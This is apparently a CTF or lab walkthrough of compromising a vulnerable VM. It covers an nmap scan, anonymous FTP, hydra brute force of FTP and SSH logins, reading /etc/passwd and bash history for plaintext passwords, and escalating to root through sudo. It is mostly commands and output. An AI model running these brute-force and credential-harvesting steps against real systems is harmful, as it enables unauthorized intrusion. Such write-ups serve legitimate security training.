## Nmap
```bash
nmap -A -T4 -p 21,22,53,80,139,666,3306,12380 --open 192.168.225.148

21/tcp    open  ftp         vsftpd 2.0.8 or later                                                                                                                                                                                                                                                                           
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                                                                                                                                                                                                                      
|_Can't get directory listing: PASV failed: 550 Permission denied.                                                                                                                                                                                                                                                          
| ftp-syst:                                                                                                                                                                                                                                                                                                                 
|   STAT:                                                                                                                                                                                                                                                                                                                   
| FTP server status:                                                                                                                                                                                                                                                                                                        
|      Connected to 192.168.45.202                                                                                                                                                                                                                                                                                          
|      Logged in as ftp                                                                                                                                                                                                                                                                                                     
|      TYPE: ASCII                                                                                                                                                                                                                                                                                                          
|      No session bandwidth limit                                                                                                                                                                                                                                                                                           
|      Session timeout in seconds is 300                                                                                                                                                                                                                                                                                    
|      Control connection is plain text                                                                                                                                                                                                                                                                                     
|      Data connections will be plain text                                                                                                                                                                                                                                                                                  
|      At session startup, client count was 1                                                                                                                                                                                                                                                                               
|      vsFTPd 3.0.3 - secure, fast, stable                                                                                                                                                                                                                                                                                  
|_End of status                                                                                                                                                                                                                                                                                                             
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)                                                                                                                                                                                                                                             
| ssh-hostkey:                                                                                                                                                                                                                                                                                                              
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)                                                                                                                                                                                                                                                              
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)                                                                                                                                                                                                                                                             
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)                                                                                                                                                                                                                                                           
53/tcp    open  tcpwrapped                                                                                                                                                                                                                                                                                                  
80/tcp    open  http        PHP cli server 5.5 or later                                                                                                                                                                                                                                                                     
|_http-title: 404 Not Found                                                                                                                                                                                                                                                                                                 
139/tcp   open  netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)                                                                                                                                                                                                                                                  
666/tcp   open  pkzip-file  .ZIP file                                                                                                                                                                                                                                                                                       
| fingerprint-strings:                                                                                                                                                                                                                                                                                                      
|   NULL:                                                                                                                                                                                                                                                                                                                   
|     message2.jpgUT                                                                                                                                                                                                                                                                                                        
|     QWux                                                                                                                                                                                                                                                                                                                  
|     "DL[E                                                                                                                                                                                                                                                                                                                 
|     #;3[                                                                                                                                                                                                                                                                                                                  
|     \xf6                                                                                                                                                                                                                                                                                                                  
|     u([r                                                                                                                                                                                                                                                                                                                  
|     qYQq                                                                                                                                                                                                                                                                                                                  
|     Y_?n2                                                                                                                                                                                                                                                                                                                 
|     3&M~{                                                                                                                                                                                                                                                                                                                 
|     9-a)T                                                                                                                                                                                                                                                                                                                 
|     L}AJ                                                                                                                                                                                                                                                                                                                  
|_    .npy.9                                                                                                                                                                                                                                                                                                                
3306/tcp  open  mysql       MySQL 5.7.12-0ubuntu1                                                                                                                                                                                                                                                                           
| mysql-info:                                                                                                                                                                                                                                                                                                               
|   Protocol: 10                                                                                                                                                                                                                                                                                                            
|   Version: 5.7.12-0ubuntu1                                                                                                                                                                                                                                                                                                
|   Thread ID: 7                                                                                                                                                                                                                                                                                                            
|   Capabilities flags: 63487                                                                                                                                                                                                                                                                                               
|   Some Capabilities: Support41Auth, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, Speaks41ProtocolOld, LongColumnFlag, FoundRows, SupportsTransactions, IgnoreSigpipes, ConnectWithDatabase, SupportsCompression, InteractiveClient, ODBCClient, LongPassword, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, S
upportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins                                                                                                                                                                                                                                                      
|   Status: Autocommit                                                                                                                                                                                                                                                                                                      
|   Salt: t\x1E\x1Eu%~z\x0B\x05/\x17\x14K\x10\x02U\x182\x0E}                                                                                                                                                                                                                                                                
|_  Auth Plugin Name: mysql_native_password                                                                                                                                                                                                                                                                                 
12380/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))                                                                                                                                                                                                                                                                  
|_http-server-header: Apache/2.4.18 (Ubuntu)                                                                                                                                                                                                                                                                                
|_http-title: Site doesn't have a title (text/html).                                                                        


```

## FTP

```bash
ftp anonymous@192.168.225.148
Connected to 192.168.225.148.
-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|


#Username Harry found
# Directory enum
ls

#Results
-rw-r--r--    1 0        0             107 Jun 03  2016 note

# Get note
# Found user john and elly
# Create user file with
john
elly
harry

# users.txt
```

## Brute Force Attack

```bash
#Refer to Hydra section for nsr techniques
hydra -L users.txt -e nsr ftp://192.168.225.148

# Results
[21][ftp] host: 192.168.225.148   login: elly   password: ylle
```

## FTP As elly
```bash
#Logged in
# Aquired file :passwd
#Results
root:x:0:0:root:/root:/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/bin/false
messagebus:x:108:111::/var/run/dbus:/bin/false
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
peter:x:1000:1000:Peter,,,:/home/peter:/bin/zsh
mysql:x:111:117:MySQL Server,,,:/nonexistent:/bin/false
RNunemaker:x:1001:1001::/home/RNunemaker:/bin/bash
ETollefson:x:1002:1002::/home/ETollefson:/bin/bash
DSwanger:x:1003:1003::/home/DSwanger:/bin/bash
AParnell:x:1004:1004::/home/AParnell:/bin/bash
SHayslett:x:1005:1005::/home/SHayslett:/bin/bash
MBassin:x:1006:1006::/home/MBassin:/bin/bash
JBare:x:1007:1007::/home/JBare:/bin/bash
LSolum:x:1008:1008::/home/LSolum:/bin/bash
IChadwick:x:1009:1009::/home/IChadwick:/bin/false
MFrei:x:1010:1010::/home/MFrei:/bin/bash
SStroud:x:1011:1011::/home/SStroud:/bin/bash
CCeaser:x:1012:1012::/home/CCeaser:/bin/dash
JKanode:x:1013:1013::/home/JKanode:/bin/bash
CJoo:x:1014:1014::/home/CJoo:/bin/bash
Eeth:x:1015:1015::/home/Eeth:/usr/sbin/nologin
LSolum2:x:1016:1016::/home/LSolum2:/usr/sbin/nologin
JLipps:x:1017:1017::/home/JLipps:/bin/sh
jamie:x:1018:1018::/home/jamie:/bin/sh
Sam:x:1019:1019::/home/Sam:/bin/zsh
Drew:x:1020:1020::/home/Drew:/bin/bash
jess:x:1021:1021::/home/jess:/bin/bash
SHAY:x:1022:1022::/home/SHAY:/bin/bash
Taylor:x:1023:1023::/home/Taylor:/bin/sh
mel:x:1024:1024::/home/mel:/bin/bash
kai:x:1025:1025::/home/kai:/bin/sh
zoe:x:1026:1026::/home/zoe:/bin/bash
NATHAN:x:1027:1027::/home/NATHAN:/bin/bash
www:x:1028:1028::/home/www:
postfix:x:112:118::/var/spool/postfix:/bin/false
ftp:x:110:116:ftp daemon,,,:/var/ftp:/bin/false
elly:x:1029:1029::/home/elly:/bin/bash
```

## Create new users list
```bash
# Only ones that can have an interactive shell
grep -E '(bash|zsh|sh|dash)$' passwd | cut -d: -f1 > users2.txt

cat users2.txt 
root
peter
RNunemaker
ETollefson
DSwanger
AParnell
SHayslett
MBassin
JBare
LSolum
MFrei
SStroud
CCeaser
JKanode
CJoo
JLipps
jamie
Sam
Drew
jess
SHAY
Taylor
mel
kai
zoe
NATHAN
elly
```

## Brute force attack on SSH User List
```bash
hydra -L users2.txt -P users2.txt ssh://192.168.225.148

#Results
[22][ssh] host: 192.168.225.148   login: SHayslett   password: SHayslett

#SHayslett:SHayslett
```

## SSH as SHayslett
```bash
#Success
# No local flag. 
# Enumerate
```

## Bash History
```bash
cat /home/*/.bash_history

#Results
sshpass -p thisimypassword ssh JKanode@localhost
sshpass -p JZQuyIN5 ssh peter@localhost

cat: /home/peter/.bash_history: Permission denied
```

## SSH as JKanode

```bash
# No sudo -l privs
```

## SSH as Peter
```bash

sudo -l 
#Results
(ALL : ALL) ALL
```

## Escelate to root

```bash
sudo /bin/bash

#Success
# Grab Root Flag
```

## Locate Local.txt Flag

```bash
#Since we have root, run:
find / -iname local.txt 2>/dev/null

#results
/home/local.txt

#Grab Local.txt flag
```